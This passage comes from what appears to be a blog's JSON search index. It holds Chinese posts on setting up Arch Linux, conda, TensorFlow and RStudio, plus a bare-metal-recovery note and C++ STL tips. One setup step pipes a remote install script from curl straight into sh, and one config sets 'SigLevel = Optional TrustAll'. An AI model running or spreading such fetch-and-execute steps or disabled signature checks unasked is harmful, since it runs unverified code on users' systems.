板贪得无厌”。一方是迷茫的投资者，一方是面临中年危机只想安稳混日子的人。到底是谁的问题呢？或者说，他们都没问题？</p>\n","tags":["一点牢骚"]},{"title":"ArchLinux安装与配置","url":"/2019/05/21/ArchLinux%E9%85%8D%E7%BD%AE/","content":"<blockquote>\n<p>换了个硬盘，要重装系统了，这次记录一下我的Arch的配置，谁知道下次还要不要再装呢。。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>Nian的博客中已经很详细写明了Arch的安装过程<a href=\"https://whoisnian.com/2017/04/02/ArchLinux-Installation-Guide/\">ArchLinix Installation Guide</a></p>\n<p>我将启动盘刻录和基本系统安装都做成了脚本：</p>\n<ul>\n<li>USB启动盘制作</li>\n</ul>\n<p>在任意Linux环境下插入U盘，假定位置是<code>/dev/sda</code>，直接执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl https://raw.githubusercontent.com/XUranus/scripts/master/archlinux/archusb-maker.sh -o archusb-maker.sh</span><br><span class=\"line\">sudo ./archusb-maker.sh /dev/sda</span><br></pre></td></tr></table></figure><br>将会下载最新镜像并烧录USB启动盘。</p>\n<ul>\n<li>Arch安装 </li>\n</ul>\n<p>从USB启动，手动分区后下载安装脚本<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl https://raw.githubusercontent.com/XUranus/scripts/master/archlinux/arch-installation.sh -o arch-installation.sh</span><br></pre></td></tr></table></figure><br>配置变量后执行。之后重启系统就可以进行定制化了。</p>\n<h2 id=\"Konsole\"><a href=\"#Konsole\" class=\"headerlink\" title=\"Konsole\"></a>Konsole</h2><p>启动后，第一步就是配置konsole，安装zsh后，安装oh-my-zsh<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S git</span><br><span class=\"line\">sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"VSCode\"><a href=\"#VSCode\" class=\"headerlink\" title=\"VSCode\"></a>VSCode</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S visual-studio-code-bin</span><br></pre></td></tr></table></figure>\n<h2 id=\"基本工具\"><a href=\"#基本工具\" class=\"headerlink\" title=\"基本工具\"></a>基本工具</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#ntfs工具</span></span><br><span class=\"line\">sudo pacman -S ntfs-3g</span><br><span class=\"line\"><span class=\"comment\">#双显卡驱动</span></span><br><span class=\"line\">sudo pacman -S bumblebee</span><br><span class=\"line\"><span class=\"comment\">#网络状态</span></span><br><span class=\"line\">sudo pacman -S net-tools</span><br><span class=\"line\"><span class=\"comment\">#解压工具</span></span><br><span class=\"line\">sudo pacman -S unzip unrar</span><br><span class=\"line\"><span class=\"comment\">#ssh</span></span><br><span class=\"line\">sudo pacman -S openssh</span><br><span class=\"line\"><span class=\"comment\">#热点</span></span><br><span class=\"line\">sudo pacman -S create_ap</span><br><span class=\"line\"><span class=\"comment\">#装逼用</span></span><br><span class=\"line\">sudo pacman -S cmatrix</span><br><span class=\"line\"><span class=\"comment\">#打印系统基本信息</span></span><br><span class=\"line\">sudo pacman -S neofetch</span><br><span class=\"line\">neofetch</span><br></pre></td></tr></table></figure>\n<h2 id=\"Grub优化\"><a href=\"#Grub优化\" class=\"headerlink\" title=\"Grub优化\"></a>Grub优化</h2><p><a href=\"https://www.gnome-look.org/p/1009236/\">https://www.gnome-look.org/p/1009236/</a></p>\n<h2 id=\"输入法\"><a href=\"#输入法\" class=\"headerlink\" title=\"输入法\"></a>输入法</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S fcitx</span><br><span class=\"line\">sudo pacman -S fcitx-sunpinyin</span><br><span class=\"line\">sudo pacman -S fcitx-configtool</span><br><span class=\"line\">sudo pacman -S fcitx-im fcitx-googlepinyin</span><br></pre></td></tr></table></figure>\n<p><code>vim ~/.zshrc</code> 添加：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GTK_IM_MODULE=fcitx</span><br><span class=\"line\">QT_IM_MODULE=fcitx </span><br><span class=\"line\">XMODIFIERS=@im=fcitx </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"ArchCN常用软件\"><a href=\"#ArchCN常用软件\" class=\"headerlink\" title=\"ArchCN常用软件\"></a>ArchCN常用软件</h2><p><code>sudo vim /etc/pacman.conf</code> 增加：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[archlinuxcn]</span><br><span class=\"line\">SigLevel = Optional TrustAll</span><br><span class=\"line\">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</span><br></pre></td></tr></table></figure><br>或者使用清华的镜像源<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[archlinuxcn]</span><br><span class=\"line\"># SigLevel = Optional TrustAll</span><br><span class=\"line\">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#更新</span></span><br><span class=\"line\">sudo pacman -Sy</span><br><span class=\"line\">sudo pacman -S archlinuxcn-keyring</span><br><span class=\"line\"><span class=\"comment\">#安装yaourt</span></span><br><span class=\"line\">sudo pacman -S yaourt</span><br><span class=\"line\"><span class=\"comment\">#网易云音乐</span></span><br><span class=\"line\">sudo pacman -S netease-cloud-music</span><br><span class=\"line\"><span class=\"comment\">#TIM</span></span><br><span class=\"line\">sudo pacman -S wine wine_gecko wine-mono winetricks</span><br><span class=\"line\">sudo yaourt -S deepin-wine-tim</span><br></pre></td></tr></table></figure>\n<h2 id=\"生产工具\"><a href=\"#生产工具\" class=\"headerlink\" title=\"生产工具\"></a>生产工具</h2><h3 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h3><p>系统已经安装了mariadb，初始化即可:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</span><br><span class=\"line\">sudo systemctl start mysqld</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"常用语言\"><a href=\"#常用语言\" class=\"headerlink\" title=\"常用语言\"></a>常用语言</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S jdk</span><br><span class=\"line\">sudo pacman -S sbt</span><br><span class=\"line\">sudo pacman -S scala</span><br><span class=\"line\">sudo pacman -S go</span><br></pre></td></tr></table></figure>\n<h3 id=\"Cmake\"><a href=\"#Cmake\" class=\"headerlink\" title=\"Cmake\"></a>Cmake</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S cmake</span><br></pre></td></tr></table></figure>\n<h3 id=\"Node\"><a href=\"#Node\" class=\"headerlink\" title=\"Node\"></a>Node</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#npm</span></span><br><span class=\"line\">sudo pacman -S npm</span><br><span class=\"line\"><span class=\"comment\">#npm源</span></span><br><span class=\"line\">npm <span class=\"built_in\">set</span> registry https://registry.npm.taobao.org/</span><br><span class=\"line\"><span class=\"comment\">#yarn</span></span><br><span class=\"line\">sudo npm install -g yarn</span><br><span class=\"line\"><span class=\"comment\">#yarn源</span></span><br><span class=\"line\">yarn config <span class=\"built_in\">set</span> registry https://registry.npm.taobao.org/</span><br><span class=\"line\"><span class=\"comment\">#hexo</span></span><br><span class=\"line\">sudo npm install -g hexo</span><br></pre></td></tr></table></figure>\n<h3 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#pip</span></span><br><span class=\"line\">sudo pacman -S python-pip </span><br><span class=\"line\">mkdir ~/.pip</span><br><span class=\"line\">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>\n<p>pip.conf保存:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[global]</span><br><span class=\"line\">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"日常工具\"><a href=\"#日常工具\" class=\"headerlink\" title=\"日常工具\"></a>日常工具</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#浏览器</span></span><br><span class=\"line\">sudo pacman -S chromium</span><br><span class=\"line\"><span class=\"comment\">#ss</span></span><br><span class=\"line\">sudo pacman -S shadowsocks-qt5</span><br><span class=\"line\"><span class=\"comment\">#录屏</span></span><br><span class=\"line\">sudo pacman -S simplescreenrecorder</span><br><span class=\"line\"><span class=\"comment\">#GIF录屏</span></span><br><span class=\"line\">sudo pacman -S peek</span><br><span class=\"line\"><span class=\"comment\">#adb工具</span></span><br><span class=\"line\">sudo pacman -S adb</span><br><span class=\"line\"><span class=\"comment\">#播放器</span></span><br><span class=\"line\">sudo pacman -S vlc</span><br></pre></td></tr></table></figure>\n","tags":["Linux"]},{"title":"Archlinux下RStudio的问题汇总","url":"/2018/09/29/Archlinux%E4%B8%8BRStudio%E7%9A%84%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","content":"<blockquote>\n<p>记录Archlinux下RStudio使用的一些坑</p>\n</blockquote>\n<h3 id=\"安装R\"><a href=\"#安装R\" class=\"headerlink\" title=\"安装R\"></a>安装R</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">yaourt -S r #安装R</span><br><span class=\"line\">yaourt rstudio-desktop-bin #安装R的IDE</span><br></pre></td></tr></table></figure>\n<p>控制台输入<code>R</code>进入交互界面</p>\n<span id=\"more\"></span>\n<h3 id=\"程序包安装\"><a href=\"#程序包安装\" class=\"headerlink\" title=\"程序包安装\"></a>程序包安装</h3><p>由于默认CRAN镜像是国外，导致程序包安装经常出错，可以指定国内的CRAN<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">options(repos=structure(c(CRAN=&quot;https://mirrors.tuna.tsinghua.edu.cn/CRAN/&quot;)))  </span><br><span class=\"line\">install.packages(&quot;data.table&quot;, dependencies = TRUE)  </span><br></pre></td></tr></table></figure><br>更多镜像列表:<a href=\"https://cran.r-project.org/mirrors.html\">链接</a></p>\n<p>包安装好后加载：<code>library(data.table)</code></p>\n<h3 id=\"RNotebook导出缺少pandoc\"><a href=\"#RNotebook导出缺少pandoc\" class=\"headerlink\" title=\"RNotebook导出缺少pandoc\"></a>RNotebook导出缺少pandoc</h3><p>Arch下默认没有安装pandoc，使用rnotebook生成html需要先安装pandoc<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S pandoc</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"gfortain命令不存在\"><a href=\"#gfortain命令不存在\" class=\"headerlink\" title=\"gfortain命令不存在\"></a>gfortain命令不存在</h3><p>安装一些包，例如corrgram，需要用到gfortarn命令，Arch下需要先安装：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S gcc-fortran</span><br></pre></td></tr></table></figure></p>\n","tags":["R语言"]},{"title":"Archlinux使用Anaconda","url":"/2018/11/02/Archlinux%E4%BD%BF%E7%94%A8Anaconda/","content":"<blockquote>\n<p>conda是python的另一个包管理器，和pip并不通用 </p>\n</blockquote>\n<h1 id=\"Anaconda的安装\"><a href=\"#Anaconda的安装\" class=\"headerlink\" title=\"Anaconda的安装\"></a>Anaconda的安装</h1><p>首先Arch上已经安装了Python 3.7.1和python-pip，此时控制台输入Python，输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Python 3.7.1 (default, Oct 22 2018, 10:41:28) </span><br><span class=\"line\">[GCC 8.2.1 20180831] on linux</span><br><span class=\"line\">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class=\"line\">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure><br>之后安装Anaconda</p>\n<p>通过pacman：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S anaconda</span><br></pre></td></tr></table></figure><br>然后将<code>/opt/anaconda/bin</code>添加到<code>PATH</code>环境变量中</p>\n<span id=\"more\"></span>\n<p>此时输入python,出现：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Python 3.7.0 (default, Jun 28 2018, 13:15:42) </span><br><span class=\"line\">[GCC 7.2.0] :: Anaconda, Inc. on linux</span><br><span class=\"line\">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class=\"line\">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure></p>\n<p>发现[default]已经变成了[Anaconda]</p>\n<h1 id=\"conda和pip共存\"><a href=\"#conda和pip共存\" class=\"headerlink\" title=\"conda和pip共存\"></a>conda和pip共存</h1><p>之前用pip安装了tensorflow-cuda，import后发现找不到包，退出后<code>which python</code>发现是<code>/opt/anaconda/bin/python</code>，之前修改了环境变量使得这个位置的python优先级更高，要用default的python则需要输入<code>/usr/bin/python</code>，进入后导入tensorflow成功</p>\n<p>通过<code>conda info -e</code>查看环境：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">base * /opt/anaconda</span><br></pre></td></tr></table></figure><br>说明conda安装的的包都在这个位置，conda创建的是一个完整的环境：conda中自带一个python，只能从这个位置import，而默认的python[default]用pip装的包则在<code>/usr/lib/python3.7/site-packages/tensorflow</code></p>\n<h1 id=\"conda常用命令\"><a href=\"#conda常用命令\" class=\"headerlink\" title=\"conda常用命令\"></a>conda常用命令</h1><h2 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境\"></a>配置环境</h2><p>创建名为python36的环境。指定python版本为3.6<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda create --name python36 python=3.6</span><br></pre></td></tr></table></figure></p>\n<p>查看已创建的环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda info -e</span><br></pre></td></tr></table></figure></p>\n<p>激活python36环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source activate python36</span><br></pre></td></tr></table></figure></p>\n<p>返回默认环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source deactivate python36</span><br></pre></td></tr></table></figure></p>\n<p>复制指定环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda create --name 新环境名 --clone 原环境名</span><br></pre></td></tr></table></figure></p>\n<p>删除指定环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda remove --name python36 --all</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"包管理\"><a href=\"#包管理\" class=\"headerlink\" title=\"包管理\"></a>包管理</h2><p>安装scipy<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda install scipy</span><br></pre></td></tr></table></figure></p>\n<p>查看已安装的包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda list</span><br></pre></td></tr></table></figure></p>\n<p>查看python36环境下的包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda list -n python36</span><br></pre></td></tr></table></figure></p>\n<p>指定环境安装numpy<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda install -n python36 numpy</span><br></pre></td></tr></table></figure></p>\n<p>查找包信息<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda search numpy</span><br></pre></td></tr></table></figure></p>\n<p>更新包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda update -n python36 numpy</span><br></pre></td></tr></table></figure></p>\n<p>删除包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda remove -n python36 numpy</span><br></pre></td></tr></table></figure></p>\n<p>更新conda<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda update conda</span><br></pre></td></tr></table></figure></p>\n<p>更新anaconda<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda update anaconda</span><br></pre></td></tr></table></figure></p>\n<p>更新python<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda update python</span><br></pre></td></tr></table></figure></p>\n","tags":["Python"]},{"title":"Archlinux使用日志","url":"/2020/01/15/Archlinux%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97/","content":"<blockquote>\n<p>使用Linux是一个不断踩坑的过程，本文记录使用Archlinux时遇到的问题和解决方案</p>\n</blockquote>\n<h3 id=\"tensorflow安装404\"><a href=\"#tensorflow安装404\" class=\"headerlink\" title=\"tensorflow安装404\"></a>tensorflow安装404</h3><ul>\n<li>时间：2020-01-14</li>\n<li>问题：<code>python-tensorflow</code>包失效，提示404</li>\n<li>解决：安装<code>python-tensorflow-cuda</code></li>\n</ul>\n<h3 id=\"dlib找不到cblas\"><a href=\"#dlib找不到cblas\" class=\"headerlink\" title=\"dlib找不到cblas\"></a>dlib找不到cblas</h3><ul>\n<li>时间：2020-01-14</li>\n<li>问题：arch 使用python-dlib会提示<code>Undefined symbol: cblas_dtrsm</code></li>\n<li>解决：使用aur或archlinuxcn中的<code>openblas-lapack-git</code>代替pacman源中的<code>cblas</code>,貌似源中的<code>cblas</code>版本太低</li>\n</ul>\n<span id=\"more\"></span>\n<h3 id=\"MySQL-Workbench启动报错\"><a href=\"#MySQL-Workbench启动报错\" class=\"headerlink\" title=\"MySQL Workbench启动报错\"></a>MySQL Workbench启动报错</h3><ul>\n<li>时间：2020-11-15</li>\n<li>问题：MySQL Workbench在archlinux中出现 Could not store password: The name org.freedesktop.secrets was not provided by any .service files的错误</li>\n<li>安装<code>gnome-keyring</code>包</li>\n</ul>\n<h3 id=\"unable-to-lock-database\"><a href=\"#unable-to-lock-database\" class=\"headerlink\" title=\"unable to lock database\"></a>unable to lock database</h3><p>执行<code>pacman -Syu</code>时报错：<code>failed to synchronize all databases (unable to lock database)</code><br>解决方案：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo rm -rf /var/lib/pacman/db.lck</span><br></pre></td></tr></table></figure><br><a href=\"https://wiki.archlinux.org/title/Pacman#.22Failed_to_init_transaction_.28unable_to_lock_database.29.22_error\">参考资料</a></p>\n","tags":["Linux"]},{"title":"Archlinux配置tensorflow","url":"/2018/10/24/Archlinux%E9%85%8D%E7%BD%AEtensorflow/","content":"<p>安装python<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S python</span><br><span class=\"line\">sudo pacman -S python-pip</span><br></pre></td></tr></table></figure></p>\n<p>安装tensorflow<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pacman -S python-tensorflow-cuda</span><br><span class=\"line\">sudo pacman -S　python-pillow</span><br></pre></td></tr></table></figure></p>\n<p>如果出现Header和Library不符的情况，可以重装h5py<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo pip uninstall h5py</span><br><span class=\"line\">sudo pip install h5py</span><br></pre></td></tr></table></figure><br><span id=\"more\"></span></p>\n<p>进入python环境<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; import tensorflow as tf</span><br><span class=\"line\">&gt;&gt; tf.__version__</span><br><span class=\"line\">&#x27;1.11.0&#x27;　#说明安装成功</span><br></pre></td></tr></table></figure></p>\n","tags":["机器学习"]},{"title":"Bare Metal Recovery Solution On Linux","url":"/2024/01/06/Bare-Metal-Recovery-Solution-On-Linux/","content":"<p>When we talk about <strong>BMR (Bare Metal Recovery)</strong>, we are talking about a solution to recovery the operating system, the configurations and the documents. Distinguished from fileset backup and restore, BMR is usually used as the last resort for disaster recovery. This blog shows an feasible solution for BMR on Linux system.</p>\n<p>I implemented a volume backup utility mentioned in the article before: <a href=\"https://github.com/XUranus/VolumeBackup\">VolumeBackup</a>. This utility can perform full backup and forever increment backup to generate a volume copy with a <code>*.img</code> format, which can be used to perform block level recovery from. Actually, some free software providing mature BMR solution, e.g., <a href=\"https://clonezilla.org/\">CloneZilla</a>, peforms BMR via cloning full partition or even full disk. Block-level backup is much faster than file-level backup, thus proven to be an effective way for BMR.</p>\n<h2 id=\"How-to-backup\"><a href=\"#How-to-backup\" class=\"headerlink\" title=\"How to backup\"></a>How to backup</h2><p>To recover a Linux system fully, we need to backup it fully firstly. What we need to backup contains:</p>\n<ol>\n<li><strong>System state</strong>: This part contains system startup items like grub configurations, partition table, network configuration and so on. </li>\n</ol>\n<p>The <code>/boot</code> folder stores EFI files, grub configuration and other files that are required for  system startup, so it’s must be backuped. This directory neither contains too much files nor takes too much space (usually smaller than 500MB) so we can backup/recover it just at file-level. <code>boot</code> partition is usually initialized as a small standlone partition with <em>FAT32</em> filesystem and must be the first partition on a disk with <em>GPT</em> partition table.</p>\n<p>The root partition mentioned in the article refers to the volume that mount to <code>/</code>. It’s similiar to <code>C:\\</code> on Windows system where we call it <em>System Drive</em> and it’s must be backuped for BMR. Root partition is the place where Linux System and it’s applications and services installed, it may be large so it’s recommened to backup at block-level. If your root partition use a filesystem supporting snapshot creation like btrfs, you can create a snapshot and using VolumeBackup utility to clone it to a image format copy from the snapshot. If your root volume is a LVM logical volume, you can create the snapshot using LVM tools and perform the volume backup as well. If your root partition does not support consistency backup, you can shutdown the system and insert a new media to boot from, and backup the root volume from the new media. </p>\n<p>Disk infomation and partitions infomation are also required to backup, they will be needed to recreate the partitions when doing BMR for the reason the partition infomation may be corrupted as well. If you are using LVM to manage your volumes, you alse need to backup your PV,VG,LV infomation.</p>\n<span id=\"more\"></span>\n<ol>\n<li><strong>Document Patition</strong>：<br>Document partition refers to the partitions or volumes that used only for storing user data, which  may takes large space but not crucial for system startup. This part is similar as drives like <code>D:\\</code>,<code>E:\\</code> and so on, and should be supported to be selected by users to backup. For document parititions or volumes, we should also backup and recover it at block-level.</li>\n</ol>\n<h2 id=\"How-to-restore\"><a href=\"#How-to-restore\" class=\"headerlink\" title=\"How to restore\"></a>How to restore</h2>","tags":["DataProtect"]},{"title":"C++常用STL技巧","url":"/2022/07/04/C-%E5%B8%B8%E7%94%A8STL%E6%8A%80%E5%B7%A7/","content":"<p>本人原先也是在学校系统学过C，在工作之前对于C++的运用只是停留在”C With <code>std::cout</code>“的阶段，而工作后也没有时间系统阅读C++的大部头书籍，于是本文便作为一个碎片化学习历程的记录，记录一些常用的C++标准库使用技巧。</p>\n<h3 id=\"std-isdigit\"><a href=\"#std-isdigit\" class=\"headerlink\" title=\"std::isdigit\"></a>std::isdigit</h3><p>判断一个字符是否是数字，通常可以这样实现：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsDigit</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span> </span>&#123; <span class=\"keyword\">return</span> ch &gt;= <span class=\"string\">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class=\"string\">&#x27;9&#x27;</span>; &#125;</span><br></pre></td></tr></table></figure><br>也可以直接用<code>std::isdigit</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> ch = <span class=\"string\">&#x27;8&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (std::<span class=\"built_in\">isdigit</span>(ch)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h3 id=\"std-transform\"><a href=\"#std-transform\" class=\"headerlink\" title=\"std::transform\"></a>std::transform</h3><p><code>std::transform</code>有两类操作，一类是一元操作，另一种是二元操作。一元操作接受一个容器的迭代器区间，再次区间内执行参数4的定义函数，将结果存放在参数3指定的迭代器位置。<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InputIterator</span>, <span class=\"keyword\">class</span> <span class=\"title\">OutputIterator</span>, <span class=\"keyword\">class</span> <span class=\"title\">UnaryOperation</span>&gt;</span></span><br><span class=\"line\">  <span class=\"function\">OutputIterator <span class=\"title\">transform</span> <span class=\"params\">(InputIterator first1, InputIterator last1,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            OutputIterator result, UnaryOperation op)</span></span>;</span><br></pre></td></tr></table></figure><br>例如，将字符串原地转大写：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::string str = <span class=\"string\">&quot;I will kick your ass&quot;</span>;</span><br><span class=\"line\">std::<span class=\"built_in\">transform</span>(str.<span class=\"built_in\">begin</span>(), str.<span class=\"built_in\">end</span>(), str.<span class=\"built_in\">begin</span>(), std::toupper); <span class=\"comment\">// str: &quot;I WILL KICK YOUR ASS&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>std::transform</code>的二元操作版本将接受<strong>来自两对迭代器区间</strong>，同时遍历两个区间，对两个操作数执行参数5指定的二元操作函数，并将结果设置在参数4定义的区间位置：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InputIterator1</span>, <span class=\"keyword\">class</span> <span class=\"title\">InputIterator2</span>,</span></span><br><span class=\"line\"><span class=\"class\">          <span class=\"keyword\">class</span> <span class=\"title\">OutputIterator</span>, <span class=\"keyword\">class</span> <span class=\"title\">BinaryOperation</span>&gt;</span></span><br><span class=\"line\">  <span class=\"function\">OutputIterator <span class=\"title\">transform</span> <span class=\"params\">(InputIterator1 first1, InputIterator1 last1,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            InputIterator2 first2, OutputIterator result,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            BinaryOperation binary_op)</span></span>;</span><br></pre></td></tr></table></figure><br>例如，实现两个数组的逐项累加：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::vector&lt;<span class=\"keyword\">int</span>&gt; vec1 &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span> &#125;;</span><br><span class=\"line\">std::list&lt;<span class=\"keyword\">int</span>&gt; list1 &#123; <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span> &#125;;</span><br><span class=\"line\">std::<span class=\"built_in\">transform</span>(vec1.<span class=\"built_in\">begin</span>(), vec1.<span class=\"built_in\">end</span>(), list1.<span class=\"built_in\">begin</span>(), vec1.<span class=\"built_in\">begin</span>(), std::plus&lt;<span class=\"keyword\">int</span>&gt;());</span><br><span class=\"line\"><span class=\"comment\">// vec1: &#123; 6, 6, 6, 6, 6&#125; list1: &#123;5, 4, 3, 2, 1&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"std-to-string\"><a href=\"#std-to-string\" class=\"headerlink\" title=\"std::to_string\"></a>std::to_string</h3><p>由于C++强类型的约束，不能直接把<code>std::string</code>和数字类型相加。C++11以后可以直接用<code>std::to_string(num)</code>把数字转为<code>std::string</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">std::string message = <span class=\"string\">&quot;Num is: &quot;</span>;</span><br><span class=\"line\">message += std::<span class=\"built_in\">to_string</span>(a); <span class=\"comment\">// &quot;Num is: 10&quot;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"std-replace\"><a href=\"#std-replace\" class=\"headerlink\" title=\"std::replace\"></a>std::replace</h3><p><code>std::replace</code>通过传入一组迭代器区间，将其范围内值等于<code>_Oldval</code>的元素替换为<code>_Newval</code>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;class _FwdIt,class _Ty&gt; <span class=\"keyword\">inline</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">replace</span><span class=\"params\">(_FwdIt _First, _FwdIt _Last, <span class=\"keyword\">const</span> _Ty&amp; _Oldval, <span class=\"keyword\">const</span> _Ty&amp; _Newval)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t<span class=\"comment\">// replace each matching _Oldval with _Newval</span></span><br><span class=\"line\">\t_DEBUG_RANGE(_First, _Last);</span><br><span class=\"line\">\t_Replace_unchecked(_Unchecked(_First), _Unchecked(_Last),</span><br><span class=\"line\">\t\t_Oldval, _Newval);</span><br><span 